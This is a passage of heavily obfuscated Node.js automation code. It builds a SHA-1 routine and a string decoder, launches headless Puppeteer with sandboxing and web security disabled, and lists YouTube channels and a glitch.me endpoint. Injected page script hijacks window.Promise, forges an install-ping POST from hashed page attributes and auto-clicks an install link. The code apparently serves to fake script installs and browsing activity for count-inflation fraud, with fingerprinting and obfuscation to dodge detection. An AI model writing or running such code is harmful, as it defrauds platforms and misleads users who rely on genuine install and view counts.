                J[0xb5f * 0x1 + 0x63e + -0x1 * 0x118d] = this['block'], J[K >> -0x6d3 * 0x1 + -0xd7f * -0x1 + 0x355 * -0x2] |= x[-0x1 * 0x7a0 + 0x7b3 + -0x10 & K], this['block'] = J[0x6b * -0x29 + 0x178c * -0x1 + 0x28bf], K >= 0x1 * 0x2583 + 0x434 + 0x297f * -0x1 && (this['hashed'] || this['hash'](), J[0x7f * 0xd + -0x182a + 0x11b7] = this['block'], J[-0x917 * 0x2 + -0x13b9 + 0x25f7] = J[0x2288 + -0x25a + -0x202d] = J[0x2 * 0x26 + 0xc5 * 0x2f + -0x40d * 0x9] = J[-0x2 * 0xb55 + 0xcf1 + 0x9bc] = J[-0x4 * 0x996 + 0x24b * -0x3 + 0x2d3d] = J[0x87 + 0xb * 0x243 + -0x1963 * 0x1] = J[-0x1284 + -0x4fc + 0x2 * 0xbc3] = J[0x4 * -0x87a + 0x58c + -0xa9 * -0x2b] = J[0x2 * -0x4df + -0x180e + 0x362 * 0xa] = J[-0x2 * 0x1fa + 0x6f6 + -0x2f9] = J[0x19ea + 0x193b + 0x331b * -0x1] = J[0xe12 + -0x2132 + -0x7 * -0x2bd] = J[-0xd37 * 0x2 + -0x243f + 0x3eb9] = J[-0x9e6 + -0x1 * 0x26e + -0x1 * -0xc61] = J[0x8e5 + 0x123 * -0x13 + 0xcc2] = J[-0x6f + 0x749 * -0x2 + 0xf10] = -0x1f * 0x18 + 0x1ca * 0xa + 0x4 * -0x3bf), J[-0x191d * -0x1 + -0x13 * 0x52 + -0x12f9] = this['hBytes'] << 0x5 * 0x199 + 0x247 * -0x1 + -0x5b3 | this['bytes'] >>> 0x3 * -0xb0d + -0x1 * -0x7af + 0x1995, J[-0x12 * -0xd + 0x25b9 + -0x2694] = this['bytes'] << 0x403 + -0x30 * -0x86 + -0x1d20, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x387 + 0x26b0 + -0x147 * 0x21; J < 0x217e + 0xe22 + 0x1 * -0x2f50; ++J)
                K = Q[J - (0x16e5 * -0x1 + 0x116a * -0x1 + 0x2852)] ^ Q[J - (-0x3 * 0x837 + 0x9b * -0x35 + 0x38c4 * 0x1)] ^ Q[J - (-0xa06 * -0x2 + -0x128f * 0x1 + -0x1 * 0x16f)] ^ Q[J - (-0x2471 * 0x1 + 0x2306 + 0x1 * 0x17b)], Q[J] = K << 0x7 * 0x2b1 + -0xaf7 + 0x9b * -0xd | K >>> 0x26e6 + -0x19d3 + -0x1 * 0xcf4;
              for (J = -0x9 * -0x207 + -0x10f5 + 0xb * -0x1e; J < 0x1f55 + 0x1caa * 0x1 + -0x3beb; J += 0x1 * -0x1835 + 0x1 * 0x1f00 + -0x6c6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd1b + 0x1426 * -0x1 + 0x2146 | L >>> -0x7d * 0x3d + 0x1 * 0x93b + -0x6e3 * -0x3) + (M & N | ~M & O) + P + (0xa08fb95 * 0xa + 0x60 * -0x78cb45 + 0x2374dfa7) + Q[J] << 0x1a15 + 0x13 * 0x1b1 + -0x8 * 0x747) << -0xd1 + 0x13c7 + -0x12f1 | P >>> 0x332 * -0xc + 0x24be + 0x1b5) + (L & (M = M << -0x19c6 + 0x1 * 0x4f0 + 0xa7a * 0x2 | M >>> 0x2033 + -0x3cd + -0x1c64) | ~L & N) + O + (-0x245461c9 + -0x81a7 * -0x3d83 + 0x5fafb7ed) + Q[J + (-0x521 * 0x1 + -0x2 * 0x1d3 + 0x8c8)] << -0x1b36 + 0x10e2 * -0x1 + 0x2c18) << 0xae0 * 0x3 + -0x1 * 0x1ddb + -0x2c0 | O >>> 0x25d5 * 0x1 + -0x17fc + 0x6df * -0x2) + (P & (L = L << -0x174a + 0x1f2d * -0x1 + 0x1 * 0x3695 | L >>> -0xafc + 0x145 * 0x11 + 0x1 * -0xa97) | ~P & M) + N + (-0x1 * 0x39d0a8c1 + -0x2655989f + 0x15baef * 0x897) + Q[J + (-0xa84 * -0x1 + -0x1ec * -0xe + 0x2 * -0x12b5)] << 0x2 * -0x966 + 0x1c0d + -0x941) << 0x25 * 0x4f + 0x11 * -0x205 + 0x135 * 0x13 | N >>> -0xaed * -0x3 + 0x968 * 0x3 + -0x3ce4) + (O & (P = P << 0x172 * 0x12 + -0xb12 + -0xed4 | P >>> 0x15ae + -0x6a5 + -0xf07) | ~O & L) + M + (-0xa846e0b * -0x2 + 0x510b6371 + -0x6 * 0x1eda0fd) + Q[J + (0x1fc0 + 0x11dc + -0x3199)] << -0x1e5c + -0x1 * 0x1bfd + 0x3a59) << 0x111 * -0x11 + 0x129d + 0x77 * -0x1 | M >>> -0x21 * 0xef + -0x8c3 * -0x3 + 0x1 * 0x4a1) + (N & (O = O << 0x559 + 0x1220 + 0x3 * -0x7c9 | O >>> 0x1 * 0x1f20 + 0x1269 + -0x1f * 0x199) | ~N & P) + L + (0x3ebf4afd + 0xafb241c + 0xeeab4 * 0x120) + Q[J + (0x95 * 0x3a + 0x3e3 + 0xc8b * -0x3)] << 0x1b44 + 0x21 * -0xbb + 0x1 * -0x329, N = N << -0x11ed + -0x2575 + 0x3780 | N >>> -0x20a0 + -0x1 * -0xb9d + 0x1505;
              for (; J < -0x1697 + -0x5 * 0x151 + 0x4 * 0x755; J += -0x53 + -0x28f + 0x2e7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x39e + -0x16b2 + 0x1319 * 0x1 | L >>> -0x3 * -0xdb + 0x1374 + -0x15ea) + (M ^ N ^ O) + P + (0x638b9615 + 0x1 * 0xcc22c475 + -0xc0d46ee9) + Q[J] << 0x1 * 0x19d9 + -0x2 * 0x34e + -0x133d) << -0x1d37 + -0x21ee + 0x3f2a | P >>> -0x6d * 0xb + 0x106c + -0xba2) + (L ^ (M = M << -0x1820 + 0x31c + 0x1522 | M >>> 0x1a2a + 0x25 * 0x1 + 0x1a4d * -0x1) ^ N) + O + (-0x3 * 0x345ef4d1 + -0xcaf5d23c + -0x12 * -0x1a2996e8) + Q[J + (0x163c + 0x1 * -0x1ddd + 0x7a2)] << 0x8c7 + 0xd87 + 0x476 * -0x5) << 0x20f6 + -0x2 * -0x45a + -0x29a5 | O >>> 0xcc1 * -0x3 + 0x9a7 + 0x1cb7) + (P ^ (L = L << -0x13c + 0x53c + -0x8e * 0x7 | L >>> -0x7 * 0x4e5 + -0x24 * -0x63 + 0x1459) ^ M) + N + (0x79b27a5 + -0x1e9e1ab9 + 0x85dcdeb5) + Q[J + (-0x201d + 0x2080 + -0x61)] << -0x1722 + -0x111f + -0xd6b * -0x3) << -0x5 * 0x6b2 + 0x1 * -0x18f7 + 0x3a76 | N >>> -0x1 * -0x10ad + 0x1 * -0x6be + -0x9d4) + (O ^ (P = P << 0x1131 + 0x204a * 0x1 + -0x315d | P >>> 0x9a9 * 0x2 + -0x5f2 * -0x3 + 0x1e * -0x13d) ^ L) + M + (-0xbcdf7daa + -0x3bfa03cb + 0x167b36d16) + Q[J + (0x476 + -0xed * -0xa + -0x1 * 0xdb5)] << -0x178b + 0xb4b + 0xc40) << 0x13b9 + -0xf9e + -0x416 | M >>> 0x2e * 0x11 + 0x5cb + -0x8be) + (N ^ (O = O << -0x1 * 0x1f9f + 0x1970 + 0x64d | O >>> -0x1e85 * 0x1 + 0x551 * 0x1 + -0x1 * -0x1936) ^ P) + L + (-0xcb12aeb4 + -0xc6052022 + 0x1fff1ba77) + Q[J + (0xf * 0x17 + -0x133c * 0x1 + -0x1 * -0x11e7)] << -0x1abf + -0x1636 + 0x53 * 0x97, N = N << 0x2 * -0x929 + -0xedb + 0x214b | N >>> -0x13 * 0x1a6 + -0x1 * 0x26ab + 0x63 * 0xb5;
              for (; J < -0x11b * -0x13 + 0x1487 + -0x294c; J += -0x12f1 + 0x255c + -0x1266)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2154 + -0x3d * -0x7f + -0x3f92 | L >>> 0x416 * -0x8 + 0x1d7 + 0x1ef4) + (M & N | M & O | N & O) + P - (-0x61f1 * -0x1c97f + -0x779bb5cf + 0x39782964) + Q[J] << 0x270d + 0x47 + -0x2754) << 0xeef * -0x2 + -0x212b * -0x1 + -0x2a * 0x14 | P >>> 0x2194 + -0x1703 + 0xce * -0xd) + (L & (M = M << -0x266a + -0x230e + 0x4996 | M >>> 0x1c30 + -0x2 * 0xde7 + -0x60) | L & N | M & N) + O - (-0x795d1130 + 0xaaf8702 * -0x4 + 0x114ff705c) + Q[J + (0xd05 + 0x2 * 0x9e + -0x30 * 0x4c)] << 0x6cb * -0x3 + -0x3 * -0x9c2 + -0x2f7 * 0x3) << -0x38 * 0xa + 0x1c5b + -0x1a26 | O >>> -0x9e8 + -0xd9b + 0x179e) + (P & (L = L << 0x1f8b + 0x901 + 0x2 * -0x1437 | L >>> -0x458 * -0x4 + 0xa * 0x2b4 + -0x2c66) | P & M | L & M) + N - (0x81acb82b * -0x1 + 0x1 * 0xd24fee47 + 0x20410d08) + Q[J + (0xb7e * 0x1 + 0xa4 * 0xd + -0x13d0)] << 0x4b9 * 0x3 + 0x14f + -0x1 * 0xf7a) << -0x1b8 + -0x5 * 0x15 + -0x1 * -0x226 | N >>> 0x4cd * -0x4 + -0xa85 * -0x2 + -0x1bb * 0x1) + (O & (P = P << -0x227f + -0x6ee + 0x1 * 0x298b | P >>> -0x1586 + 0x796 * -0x1 + -0xe8f * -0x2) | O & L | P & L) + M - (-0x19b9 * 0x4a6a2 + -0xc443eed8 + 0x1acca6f0e) + Q[J + (0x3 * 0x25f + 0x1d + -0x1 * 0x737)] << 0xd0b + -0x344 + -0x1 * 0x9c7) << 0x22a3 * -0x1 + -0x13cc + 0x3674 | M >>> -0x1 * 0xa6b + 0xe6 * -0x1d + 0x2494) + (N & (O = O << -0x1 * 0x1119 + 0x60d * -0x1 + 0x1744 | O >>> -0x47 * 0x59 + 0x191 * -0x13 + 0x3674) | N & P | O & P) + L - (-0x2243de * 0x583 + 0x21c4348b + 0x1 * 0x10bfc1f33) + Q[J + (0x194d + -0x11c3 * 0x1 + 0x2 * -0x3c3)] << -0x11 * -0x10d + -0x85 * -0x2e + -0x29c3 * 0x1, N = N << -0x1449 + 0x38 * -0x1d + -0xa7 * -0x29 | N >>> -0x2358 + 0x5a6 + 0x1db4 * 0x1;
              for (; J < -0xd62 + 0x9f2 + 0x3c0; J += 0x82 * -0x38 + 0x11f5 * 0x1 + 0x20 * 0x54)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1a8 * 0x2 + -0x1957 + 0x160c | L >>> -0xb77 + -0x1174 + 0x1d06) + (M ^ N ^ O) + P - (0x3da619df + 0x4227d16d + 0x1 * -0x4a30ad22) + Q[J] << 0x1e3 * -0x1 + 0x6f1 + 0x287 * -0x2) << 0x22a + -0xa29 * -0x3 + -0x20a0 | P >>> -0x295 + 0x1846 * -0x1 + -0xe * -0x1ed) + (L ^ (M = M << -0x23 * -0x21 + -0xfe5 * 0x1 + 0x40 * 0x2e | M >>> 0x23e1 + 0x1d79 + -0x4158) ^ N) + O - (0x3324 * 0x2281 + -0x94a39f + -0x1a19029 * -0x1d) + Q[J + (0x1fee + 0x18f2 * -0x1 + -0x6fb)] << -0x557 * -0x4 + -0x12b * -0x1 + 0x49 * -0x4f) << -0xb * 0x2bd + -0xc1e + 0x2a42 | O >>> 0x13af * 0x1 + 0xa7 * 0x23 + -0x2a69) + (P ^ (L = L << -0x2221 + 0x40c + 0x1e33 | L >>> 0x3 * 0x291 + -0x1911 + 0x1160) ^ M) + N - (0x3d579973 * -0x1 + 0x468b4087 * 0x1 + -0x1eb29 * -0x1726) + Q[J + (0x2 * 0xfa5 + -0xac7 * -0x3 + 0x5 * -0xcb9)] << -0x1b53 + -0x13f4 + -0x5b * -0x85) << 0x1 * -0xd9b + -0x57f + 0x37 * 0x59 | N >>> 0x7b9 + 0x18f7 + -0x2095) + (O ^ (P = P << -0x2060 + 0x683 * -0x2 + 0x2d84 | P >>> -0x25c3 + -0x18a * -0x9 + 0x17eb) ^ L) + M - (-0x1e25497 * -0x1 + -0x984d * -0x69bf + -0xb2e4ce0) + Q[J + (-0x1 * -0x4db + 0xc4d + -0x1125)] << -0x274 + 0x17fb + -0x72d * 0x3) << -0x553 + -0x56a + 0xac2 | M >>> -0x1b * -0x32 + -0x5a6 + -0x3 * -0x29) + (N ^ (O = O << 0x197d + 0x1dcc + -0x1e7 * 0x1d | O >>> 0x2 * 0x7fe + 0x35 * 0x79 + -0x2907) ^ P) + L - (0x3a002184 + -0x2ff19879 + -0x5cf * -0x77fb1) + Q[J + (-0x1a72 + -0x197d + 0x33f3)] << 0xf * 0x28d + -0x2421 + 0x6 * -0x5b, N = N << -0xb5 * 0x29 + 0xd * 0x1f + 0xdc4 * 0x2 | N >>> 0x1 * -0x1199 + 0x3e8 + 0xdb3;
              this['h0'] = this['h0'] + L << -0x11 * 0x65 + 0x1767 + -0x10b2, this['h1'] = this['h1'] + M << -0xb * -0x141 + -0x190c + 0xb41 * 0x1, this['h2'] = this['h2'] + N << -0x3b * 0x29 + 0x5a5 + 0x3ce, this['h3'] = this['h3'] + O << -0x1a17 + 0x15d4 + 0x443 * 0x1, this['h4'] = this['h4'] + P << -0x122a + -0x2545 * 0x1 + -0x376f * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1d08 + -0xb36 + 0x285a & 0x1cc8 + 0x1ecd * -0x1 + -0x7 * -0x4c] + w[J >> -0x14b8 + 0x1 * 0xd1f + 0x7b1 & -0x184d + -0x10c + 0x1968] + w[J >> 0x1775 + 0xab8 + -0x2219 & -0xa59 + -0x4 * -0x44d + -0x6cc] + w[J >> -0x69 + 0xa1 * -0x2e + 0x1d67 & -0x40f * 0x1 + -0x1 * 0x1307 + 0x1725] + w[J >> 0x2 * -0x1241 + 0x1445 + 0x1049 & -0x1fec + 0x214a * 0x1 + 0x5 * -0x43] + w[J >> -0x2 * 0x7eb + 0x1 * -0xb5 + 0x1093 * 0x1 & -0x1e65 + -0x1d12 + 0x3b86] + w[J >> -0x27 * 0x8e + 0x4ad + 0x10f9 & -0x88 + -0x26b3 + 0x13a5 * 0x2] + w[0x8d9 + -0x143f * 0x1 + 0xb75 & J] + w[K >> 0x9a2 + -0xd86 + 0x2 * 0x200 & 0x212 * 0xe + 0x1fa0 + -0x3c8d] + w[K >> -0x24fe + 0xc61 * -0x1 + 0x3177 & -0x722 + 0x1155 + -0xb * 0xec] + w[K >> 0xd16 + -0x7 * 0x1f5 + -0xb1 * -0x1 & -0x1 * -0x1544 + 0xb3b + -0x2070] + w[K >> -0x5 * 0x6 + -0x1 * 0xffc + -0x2 * -0x815 & 0x6f * 0x2f + 0x1fbb + 0xd * -0x401] + w[K >> 0x20b2 + 0x196 * 0xe + -0x36da & 0xbf * 0x25 + 0x5b6 + -0x2142] + w[K >> -0x1f90 * -0x1 + -0x1 * -0x22bb + -0x1 * 0x4243 & -0x11 * 0x56 + -0x12 * 0xe + -0xf7 * -0x7] + w[K >> 0x7d8 + 0x243b + 0x2c0f * -0x1 & 0x4 * -0x7b3 + 0x5 * -0x3c1 + -0x10 * -0x31a] + w[0x5 * 0xb9 + -0x1674 + 0x12e6 & K] + w[L >> 0xd66 + 0x6ee * -0x2 + 0x92 & -0x105b + 0x1362 + 0x1 * -0x2f8] + w[L >> -0x13ff + 0x8 * 0x4bd + -0x11d1 * 0x1 & -0x15 * -0x197 + 0x270c + -0x4860] + w[L >> -0x19 * -0x61 + -0x205 * -0x5 + -0x137e & -0x5 * 0xfb + 0x7a * 0x4a + -0x1e4e] + w[L >> -0x5ef + -0x1 * 0x1839 + 0x1e38 & -0x1d34 + 0x2012 + -0x2cf * 0x1] + w[L >> -0x2456 + 0x105 + 0x235d & -0x87f * 0x1 + -0x1f79 + -0x1 * -0x2807] + w[L >> -0x1d7 * -0x5 + -0x8ef * -0x1 + -0x121a & 0xc38 + 0x74a + 0x17f * -0xd] + w[L >> 0x2 * -0xfad + -0x153d + 0x349b & 0x1a3d + 0x1ec9 + -0x38f7] + w[-0x1 * -0x221b + 0xeaa * -0x1 + -0x1362 & L] + w[M >> 0x2 * -0x17 + 0xb21 + -0xad7 & 0x210e + -0x5 * 0x1df + -0x17a4] + w[M >> 0xa0e + 0x1caf + -0x26a5 & -0x1cba + -0x1604 + 0x32cd] + w[M >> -0x37f * -0x4 + -0x166a * 0x1 + 0x882 & 0x2 * 0x1283 + -0x1c74 + -0x883] + w[M >> 0x25b4 + -0x203f + -0x565 & -0x2273 * -0x1 + -0x1155 + -0x110f] + w[M >> -0x1715 + 0x1 * -0x587 + 0x83 * 0x38 & 0x464 * -0x7 + 0xd28 + 0x11a3] + w[M >> -0xe3e + -0xd2 + -0xf18 * -0x1 & -0x2 * 0x10d5 + -0x13d5 * 0x1 + -0x3 * -0x11da] + w[M >> -0x1 * -0x2632 + 0x1 * -0x94d + -0x1 * 0x1ce1 & 0x1f43 + 0x26d1 * -0x1 + -0x79d * -0x1] + w[-0x1 * -0x2543 + -0x66b * -0x1 + -0xd * 0x35b & M] + w[N >> 0x1569 + 0x511 * 0x4 + -0x2991 & -0xd0a + 0x5 * 0x22f + 0x22e] + w[N >> 0x201b + -0xbd6 + -0x142d * 0x1 & 0x99 * 0x3 + 0x15f3 + -0x17af] + w[N >> -0x12f5 + -0x1622 + -0x292b * -0x1 & 0x3 * -0x47f + 0x1 * 0x895 + 0x1 * 0x4f7] + w[N >> 0x20 * -0x20 + -0x21be + -0x25ce * -0x1 & -0x2 * -0x4d9 + 0x6 * -0x39e + 0x1 * 0xc11] + w[N >> -0xcc1 + 0x1 * -0x1115 + 0x1de2 & -0x1794 + -0x659 + -0x77f * -0x4] + w[N >> 0x1c5f + 0xc78 + -0x28cf & 0x2014 + -0x1a3e + -0x5c7] + w[N >> 0x1463 + -0x1582 + 0x123 & -0x1d7 * -0x1 + 0xd27 + 0xeef * -0x1] + w[0x103 * 0x11 + -0x1832 + 0x70e * 0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x17ef + -0x112a + 0x1 * -0x6ad & -0x3c1 * 0x1 + -0x419 * 0x7 + 0x216f,
                J >> 0x18a5 + 0x1d06 + -0x359b & -0x1 * 0xaab + 0x10de + -0x4 * 0x14d,
                J >> -0xc1c + 0x121c + 0x5f8 * -0x1 & -0x1b9f + 0xd * 0x13f + 0xc6b,
                -0x5ed + -0x1f * 0x119 + 0xb * 0x3b9 & J,
                K >> 0x60 * 0x24 + 0xb80 + -0x18e8 & 0x1 * 0x7ae + -0x3 * -0x55b + -0x5b * 0x40,
                K >> -0x1a25 + 0x192e + 0x107 & -0x1 * 0x1383 + -0x1 * -0x1d95 + -0x913,
                K >> 0x218a + 0xb06 * 0x2 + -0x378e & -0x1f58 + 0xb * 0x147 + 0x925 * 0x2,
                0xcd7 + -0x106a * -0x1 + 0x1 * -0x1c42 & K,
                L >> 0x11 * 0x1df + -0x198b + -0x2 * 0x316 & 0x40f + -0x1885 + -0x727 * -0x3,
                L >> -0x3a9 * -0x7 + -0x2 * -0x906 + -0x2b9b & 0x1 * 0x1d9f + 0x1fd8 + 0xac * -0x5a,
                L >> 0x20da + -0x1 * 0xbb + -0x2017 & -0x261b * 0x1 + 0x710 + 0x200a,
                0x944 + 0x1899 + -0x20de & L,
                M >> -0x116f * 0x1 + -0x8fd + 0x1a84 & -0x1043 + 0xbcf * 0x1 + 0x573,
                M >> 0x1da5 + 0x79 * 0x2 + -0x1e87 & 0x5 * -0x239 + -0x14b * 0x7 + -0x1529 * -0x1,
                M >> -0x8e9 * 0x3 + 0x586 + 0x153d & 0x51d + -0x22d9 * 0x1 + 0x1 * 0x1ebb,
                0xb3a + -0x193 * -0x1 + -0x1 * 0xbce & M,
                N >> -0x1 * -0x16ab + 0x7e2 + 0x3 * -0xa27 & -0x2660 * -0x1 + 0x523 * 0x3 + -0x1d2 * 0x1d,
                N >> -0x1 * 0xb47 + 0x1332 + -0x7db * 0x1 & 0x2156 + -0x2 * 0xd78 + -0x567,
                N >> -0xac3 + 0x2 * 0x8ca + -0x6c9 & 0x1061 * 0x2 + 0x401 * 0x1 + 0xda * -0x2a,
                0x2 * -0x964 + 0xf08 + 0x5 * 0xf3 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x256a + 0x198f + 0xbef), (K = new DataView(J))['setUint32'](-0x19c9 + 0xbe1 + 0x28 * 0x59, this['h0']), K['setUint32'](0x1 * -0x1cb7 + -0x98 * 0x36 + 0x3ccb, this['h1']), K['setUint32'](-0x2665 + 0x7da + 0xa31 * 0x3, this['h2']), K['setUint32'](0x1d51 + -0x1a10 + -0x335, this['h3']), K['setUint32'](-0xd55 * 0x2 + 0x2 * -0x90 + -0x17 * -0x136, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xbe1 + 0x10e8 * 0x1 + 0x1 * -0x1cc9];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xb8a * 0x2 + -0x1e66 + 0x752 * 0x1;
            J[-0x1243 * -0x1 + -0x1378 + -0x1 * -0x135]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x108d * -0x1 + -0x1a24 + 0x2ab1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x11 * 0x1c1 + -0x768 + 0x253a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2 * -0x5ab + 0x7 * 0x24c + -0x1b69;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x7 * 0x18a + 0x94d + -0x1 * -0x755), Promise['resolve'](0x11e * -0x5 + -0x1 * 0xbc7 + 0x115e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1655 + 0x1811 * -0x1 + 0x2e66; j < -0x1 * -0x1bfe + -0x17f * 0x17 + -0x89 * -0xc; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * 0x1cd1 + -0x13 * -0x1c1 + -0x3 * 0xa4c + (0x9b * 0x22 + -0x1b41 * -0x1 + 0x529 * -0x7) * Math['random'](),
  MM_NETWORK_PATIENCE = (0xf59 * -0x1 + -0x1 * -0xe4c + 0x110) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + W(0x4) + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1 * 0x201d + -0xa7e + -0xd * -0x347; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x815 + -0x18a9 + 0x1094);
    let h = e[f];
    if (b['BssPpf'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xa0 * -0x2b + -0x4d3 + -0x469 * 0x5, s, t, u = -0x5d1 * -0x2 + -0x332 * 0x2 + -0x53e; t = n['charAt'](u++); ~t && (s = r % (0x10af + -0x3cc + -0xcdf) ? s * (-0xb3 * -0x5 + -0x41b * 0x5 + -0x4 * -0x452) + t : t, r++ % (-0x11 * -0x1af + 0x16 * -0x27 + -0x1941)) ? p += String['fromCharCode'](-0x7 * -0x1f3 + -0x1b5d + 0xeb7 & s >> (-(-0x2484 + 0x431 * 0x1 + 0x2055) * r & -0x1173 * 0x2 + -0x175d + -0x2b * -0x15b)) : 0xc69 + -0x49e + -0x7cb) {
          t = o['indexOf'](t);
        }
        for (let v = -0x166b + 0x7dc * -0x1 + -0x1e47 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x21 * -0x1 + -0xa3b + 0x17 * 0x74))['slice'](-(-0x13f6 + -0x2 * 0x648 + 0x2088));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2b3 + -0x12 * 0x16 + -0x127 * 0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x20e7 + -0x1b43 * 0x1 + 0x3c2a; u < 0x1 * -0x383 + 0x1ac1 + 0xb1f * -0x2; u++) {
          p[u] = u;
        }
        for (u = 0x6d * -0x2b + 0x110b + 0x144 * 0x1; u < 0xa70 + 0x20b2 + -0x1511 * 0x2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1f90 + -0x3 * -0x7aa + -0x23 * -0x46), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x577 * 0x4 + 0x672 + -0x1c4e, q = -0x1 * -0x19da + -0xb74 + 0x13 * -0xc2;
        for (let v = -0x6d * -0x59 + -0xe04 + -0x17e1; v < n['length']; v++) {
          u = (u + (0x1191 + -0x3e * 0x90 + 0x1150)) % (0x1 * 0x1cfa + 0x1aca + -0x57a * 0xa), q = (q + p[u]) % (-0x2 * 0x3a9 + 0xc63 + -0x3 * 0x15b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2047 + -0x3 * 0x453 + -0xb9 * -0x40)]);
        }
        return t;
      };
      b['xfLCPY'] = m, c = arguments, b['BssPpf'] = !![];
    }
    const j = e[0x15d * -0xf + 0x18e6 + -0x473],
      k = f + j,
      l = c[k];
    return !l ? (b['wBbKZA'] === undefined && (b['wBbKZA'] = !![]), h = b['xfLCPY'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
